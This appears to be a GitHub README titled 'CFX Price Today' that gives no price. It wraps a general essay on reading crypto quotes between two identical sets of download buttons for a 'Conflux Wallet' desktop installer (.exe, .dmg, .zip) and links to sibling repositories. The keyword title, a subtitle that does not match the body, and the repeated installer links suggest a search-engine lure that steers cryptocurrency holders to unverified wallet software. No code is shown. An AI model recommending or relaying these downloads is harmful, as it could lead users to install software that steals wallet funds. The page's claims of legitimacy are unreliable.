![Conflux Wallet](assets/banner-article.png)

# CFX Price Today

<p align="center">CFX Price Today: the checks, in order, for the current desktop release.</p>

<p align="center"><img src="https://img.shields.io/badge/LICENSE-MIT-30A0D0?style=for-the-badge&labelColor=101010" alt="License: MIT"> <img src="https://img.shields.io/badge/RELEASE-v0.6.14-30A0D0?style=for-the-badge&labelColor=101010" alt="Release v0.6.14"></p>

<p align="center"><a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-windows-v0.6.14.exe"><img src="assets/button-windows.png" alt="Download for Windows"></a> <a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-macos-v0.6.14.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-30A0D0?style=for-the-badge&labelColor=101010&logo=apple" alt="Download for macOS"></a> <a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-linux-v0.6.14.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-30A0D0?style=for-the-badge&labelColor=101010&logo=linux" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`conflux-wallet-windows-v0.6.14.exe`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-windows-v0.6.14.exe) |
| <img src="https://img.shields.io/badge/MACOS-1B6E93?style=flat-square&labelColor=101010&logo=apple" alt="macOS"> | macOS 12 or later | [`conflux-wallet-macos-v0.6.14.dmg`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-macos-v0.6.14.dmg) |
| <img src="https://img.shields.io/badge/LINUX-1B6E93?style=flat-square&labelColor=101010&logo=linux" alt="Linux"> | x64 Ubuntu 20.04 or later, or equivalent | [`conflux-wallet-linux-v0.6.14.zip`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-linux-v0.6.14.zip) |

</div>

All versions and checksums are on the [release page](https://github.com/conflux-developments/conflux-desktop-wallet/releases/tag/v0.6.14).

> Only download from this GitHub release page.

**Short answer.** This page does not print a CFX price, and that is a decision rather than an omission: a number written into a page is wrong within hours, and the figure that matters is the one on your screen when you trade. What follows is how a CFX quote is produced, how to read one, and what a wallet can and cannot tell you about value.

## Why this page has no price on it

Because a static number in a document is a lie with a delay. Documentation is cached, mirrored and quoted for years; a price is valid for seconds. Anyone publishing "CFX is worth X" is publishing a historical artefact dressed as a fact.

The honest version is a method: where the number comes from, what it is denominated in, and which numbers are not prices at all. That survives being wrong about the market, which no quoted figure does.

## Where a price actually comes from

From an order book, not from a network. A blockchain records transfers and balances; it has no concept of what one CFX is worth in dollars. A price exists because buyers and sellers on exchanges agree on one, then that agreement is aggregated across venues.

So "the price of CFX" is really a summary of several markets, weighted by volume and smoothed by whoever is doing the summarising. Two sites can show different numbers at the same second and both be defensible.

## How to read a quote

Four things worth checking before you believe a number. The pair - CFX against what, usually USDT or USD. The venue - one exchange's last trade, or an average across many. The time - a price is a timestamped observation, not a property of the asset. And the volume behind it, because a thin market can print a price nobody could actually trade at.

A quote without a venue and a time is not information. It is decoration, and it is the kind that gets screenshotted into a group chat as proof.

## CFX to USD, CFX to USDT

These are different questions. USDT is a dollar-pegged token that trades on the same venues as CFX, so a CFX/USDT pair measures against a token that is itself priced; USD is the unit of account most people actually mean.

In practice the two track closely, and the difference is small next to the difference between any quote and the price you would get filling an order of your size. That gap - the spread and the slippage - is the number that matters when you actually trade.

## Market cap and volume

Market capitalisation is price multiplied by circulating supply, which means it inherits every weakness of the price and adds a supply-definition problem: circulating, total and max supply are three different numbers, and sites do not always say which they used.

Volume is a measure of trading, not of interest, and it can be inflated by wash trading on venues with weak oversight. A big volume number is a claim about activity; it is not evidence that anyone is buying for the reason you hope.

## Predictions

Not available here, from anyone, reliably. A price forecast is a statement about the future of a market with millions of participants, and the format it usually arrives in - a target and a date - is designed to be memorable rather than accurate.

You will find pages that publish them, with numbers attached to years. Those numbers are not derived from anything you can check, and the pages carrying them are usually monetised by the attention they attract.

## "CFX stock price" and other category errors

CFX is not a stock. There is no company whose equity it represents, no earnings per share, no dividend, and no exchange listing under a ticker with a market open and close. Pages showing a "CFX stock price" are reusing a template for a different asset class.

The same applies to "CFX price in foreign exchange": in currency markets the letters are not a traded pair, and in financial documents they usually appear as shorthand local to that document. https://github.com/conflux-developments/setup-handbook/blob/HEAD/conflux-network-and-cfx-explained.md covers the acronym collisions in full.

## What a wallet can tell you instead

A wallet knows your balance, your history and your fees. It does not set or track a price, and this application deliberately does not: the numbers it shows are amounts of CFX, not valuations in dollars.

What it can do is make a transfer cheap and legible, and the current release from the release page (https://github.com/conflux-developments/conflux-desktop-wallet/releases/tag/v0.6.14) is the build those numbers describe. https://github.com/conflux-developments/recovery-playbook/blob/HEAD/conflux-wallet-gas-and-fees.md covers what a transaction costs, which is a real number the wallet can quote because the network computes it, and https://github.com/conflux-developments/setup-handbook/blob/HEAD/what-is-conflux-wallet.md covers the rest of what the app does. It is actively maintained, so the behaviour described here is the behaviour of the current release.

## Spotting a fake price page

Three signals. A countdown or a "buy before it moves" prompt - urgency is the signature of a sales page, not a market page. A wallet connection required to "unlock" a chart. And a quoted return, which no legitimate price display ever promises.

If a site wants your phrase to show you a number, the number is not the product. https://github.com/conflux-developments/setup-handbook/blob/HEAD/conflux-wallet-fake-support.md covers the family of pages that work this way, and https://github.com/conflux-developments/ecosystem-guides/blob/HEAD/how-to-buy-cfx-for-conflux-wallet.md covers the legitimate route if you actually intend to buy.

## FAQ

### What is the price of CFX today?

Not quoted here. A written figure is stale within hours; read the live pair on the venue you would actually trade on, and check its timestamp.

### How much is 1 CFX?

One CFX. Its value in dollars is whatever the market agrees at the moment you look, which is why any answer with a number in it needs a time attached.

### Is there a CFX price prediction?

None published here. Forecasts are not verifiable, and the pages that publish them are usually monetised by the attention they attract.

### What is CFX's market cap?

Price times circulating supply - which means it inherits the price's staleness and depends on which supply figure a site used. Compare sources before trusting one.

### Is CFX a stock?

No. It is the native token of a public network: no equity, no earnings, no dividend and no market open or close.

### Can the wallet show me a dollar value?

No. It shows amounts of CFX. Pricing is a market function, not a wallet function, and this app does not attempt it.

---

## Get Conflux Wallet

<p align="center"><a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-windows-v0.6.14.exe"><img src="assets/button-windows.png" alt="Download for Windows"></a> <a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-macos-v0.6.14.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-30A0D0?style=for-the-badge&labelColor=101010&logo=apple" alt="Download for macOS"></a> <a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-linux-v0.6.14.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-30A0D0?style=for-the-badge&labelColor=101010&logo=linux" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`conflux-wallet-windows-v0.6.14.exe`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-windows-v0.6.14.exe) |
| <img src="https://img.shields.io/badge/MACOS-1B6E93?style=flat-square&labelColor=101010&logo=apple" alt="macOS"> | macOS 12 or later | [`conflux-wallet-macos-v0.6.14.dmg`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-macos-v0.6.14.dmg) |
| <img src="https://img.shields.io/badge/LINUX-1B6E93?style=flat-square&labelColor=101010&logo=linux" alt="Linux"> | x64 Ubuntu 20.04 or later, or equivalent | [`conflux-wallet-linux-v0.6.14.zip`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-linux-v0.6.14.zip) |

</div>

All versions and checksums are on the [release page](https://github.com/conflux-developments/conflux-desktop-wallet/releases/tag/v0.6.14).

## Related guides

- [What Is Conflux Wallet?](https://github.com/conflux-developments/setup-handbook/blob/HEAD/what-is-conflux-wallet.md)
- [Update Conflux Wallet to the Current Release](https://github.com/conflux-developments/setup-handbook/blob/HEAD/update-conflux-wallet-to-latest-release.md)
- [Conflux Wallet Download and Current Release](https://github.com/conflux-developments/setup-handbook/blob/HEAD/conflux-wallet-download-guide.md)

[All Conflux Wallet guides](https://github.com/conflux-developments/setup-handbook/blob/HEAD/README.md)
